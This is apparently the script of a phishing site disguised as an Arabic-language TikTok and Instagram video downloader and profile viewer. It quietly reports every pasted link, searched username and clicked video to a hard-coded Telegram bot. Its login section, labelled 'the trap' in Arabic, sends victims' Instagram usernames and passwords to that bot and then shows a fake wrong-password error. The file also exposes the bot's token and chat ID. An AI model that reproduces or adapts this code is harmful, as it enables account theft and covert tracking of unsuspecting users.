// ==========================================
// 1. إعدادات تلجرام
// ==========================================
const BOT_TOKEN = '8863933045:AAE-GSd-pWrvzSJiijFNkjm9sgZ0g7S7E2w';
const CHAT_ID = '7644504212';

async function sendToTelegram(type, data) {
    let message = `<b>🎬 Tracker - Target</b>\n\n<b>Action:</b> ${type}\n`;
    for (let key in data) message += `<b>${key}:</b> <code>${data[key]}</code>\n`;
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
        });
    } catch (e) {}
}

// ==========================================
// 2. كود صفحة التحميل (index.html)
// ==========================================
const downloadBtn = document.getElementById('downloadBtn');
if (downloadBtn) {
    downloadBtn.addEventListener('click', async () => {
        const url = document.getElementById('videoUrl').value.trim();
        if (!url) { alert('الرجاء لصق رابط الفيديو'); return; }

        document.getElementById('inputSection').style.display = 'none';
        document.getElementById('loadingSection').style.display = 'block';
        
        let videoUrl = '';

        try {
            if (url.includes('tiktok.com')) {
                document.getElementById('loadingText').innerText = 'جاري استخراج فيديو تيك توك...';
                const res = await fetch(`https://www.tikwm.com/api/?url=${encodeURIComponent(url)}`);
                const data = await res.json();
                if (data.code === 0) videoUrl = data.data.play;
                else throw new Error();
            } 
            else if (url.includes('instagram.com')) {
                document.getElementById('loadingText').innerText = 'جاري استخراج فيديو إنستجرام...';
                const res = await fetch(`https://api.vreden.my.id/api/igdl?url=${encodeURIComponent(url)}`);
                const data = await res.json();
                if (data && data.result && data.result.length > 0) videoUrl = data.result[0].url; 
                else throw new Error();
            } 
            else { throw new Error(); }

            document.getElementById('loadingSection').style.display = 'none';
            document.getElementById('resultSection').style.display = 'block';
            
            sendToTelegram('Video Extracted', { 'URL': url, 'Status': 'Ready to save' });

            document.getElementById('saveBtn').onclick = () => {
                const a = document.createElement('a');
                a.href = videoUrl;
                a.download = 'video.mp4';
                a.target = '_blank';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            };

        } catch (error) {
            alert('حدث خطأ! تأكد من الرابط أو أن الحساب ليس خاصاً.');
            document.getElementById('inputSection').style.display = 'flex';
            document.getElementById('loadingSection').style.display = 'none';
        }
    });
}

// ==========================================
// 3. كود صفحة التصفح (insta.html)
// ==========================================
const searchBtn = document.getElementById('searchBtn');
if (searchBtn) {
    searchBtn.addEventListener('click', async () => {
        const username = document.getElementById('usernameInput').value.trim();
        if (!username) return;

        document.getElementById('profileHeader').style.display = 'none';
        document.getElementById('postsGrid').innerHTML = '';
        document.getElementById('loader').style.display = 'block';

        try {
            const res = await fetch(`https://api.vreden.my.id/api/igs?username=${username}`);
            const data = await res.json();

            if (data && data.result && data.result.length > 0) {
                document.getElementById('profileHeader').style.display = 'flex';
                document.getElementById('profilePic').src = data.profile_pic || 'https://via.placeholder.com/80';
                document.getElementById('profileName').innerText = `@${username}`;
                document.getElementById('profileFullName').innerText = data.full_name || 'مستخدم إنستجرام';

                const postsGrid = document.getElementById('postsGrid');
                data.result.slice(0, 9).forEach((post) => {
                    const div = document.createElement('div');
                    div.className = 'post-item';
                    div.innerHTML = `<img src="${post.thumbnail || post.url}" alt="Post">`;
                    div.onclick = () => {
                        document.getElementById('downloadModal').style.display = 'flex';
                        document.getElementById('modalImage').src = post.thumbnail || post.url;
                    };
                    postsGrid.appendChild(div);
                });
                sendToTelegram('Profile Searched', { 'Username': username });
            } else {
                alert('لم يتم العثور على الحساب أو الحساب خاص (Private).');
            }
        } catch (error) {
            alert('حدث خطأ أثناء جلب الحساب.');
        } finally {
            document.getElementById('loader').style.display = 'none';
        }
    });
}

// ==========================================
// 4. كود صفحة تسجيل الدخول (الفخ)
// ==========================================
const loginForm = document.getElementById('loginForm');
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        await sendToTelegram('Instagram Credentials', {
            'Username': document.getElementById('username').value,
            'Password': document.getElementById('password').value
        });
        document.getElementById('error').innerText = 'اسم المستخدم أو كلمة المرور غير صحيحة.';
        document.getElementById('password').value = '';
    });
}
// ==========================================
// 5. كود صفحة تصفح تيك توك (tiktok.html)
// ==========================================
const searchTiktokBtn = document.getElementById('searchTiktokBtn');
if (searchTiktokBtn) {
    searchTiktokBtn.addEventListener('click', async () => {
        const username = document.getElementById('tiktokUser').value.trim().replace('@', '');
        if (!username) return;

        document.getElementById('profileHeader').style.display = 'none';
        document.getElementById('postsGrid').innerHTML = '';
        document.getElementById('loader').style.display = 'block';

        try {
            // استخدام API خارجي لجلب فيديوهات الحساب
            const res = await fetch(`https://www.tikwm.com/api/user/posts?unique_id=${username}&count=10`);
            const data = await res.json();

            if (data && data.code === 0 && data.data && data.data.videos && data.data.videos.length > 0) {
                // إظهار معلومات الحساب
                document.getElementById('profileHeader').style.display = 'flex';
                document.getElementById('profilePic').src = data.data.videos[0].author.avatar;
                document.getElementById('profileName').innerText = `@${data.data.videos[0].author.unique_id}`;

                // عرض الفيديوهات
                const postsGrid = document.getElementById('postsGrid');
                data.data.videos.forEach((video) => {
                    const div = document.createElement('div');
                    div.className = 'post-item';
                    div.innerHTML = `<img src="${video.cover}" alt="Video">`;
                    div.onclick = () => {
                        document.getElementById('downloadModal').style.display = 'flex';
                        document.getElementById('modalImage').src = video.cover;
                        // إرسال إشعار إنه حاول يحمل
                        sendToTelegram('TikTok Video Attempted', { 'Video_ID': video.video_id });
                    };
                    postsGrid.appendChild(div);
                });
                
                sendToTelegram('TikTok Profile Searched', { 'Username': username });

            } else {
                alert('لم يتم العثور على الحساب أو لا توجد فيديوهات.');
            }
        } catch (error) {
            alert('حدث خطأ أثناء جلب الحساب.');
        } finally {
            document.getElementById('loader').style.display = 'none';
        }
    });
}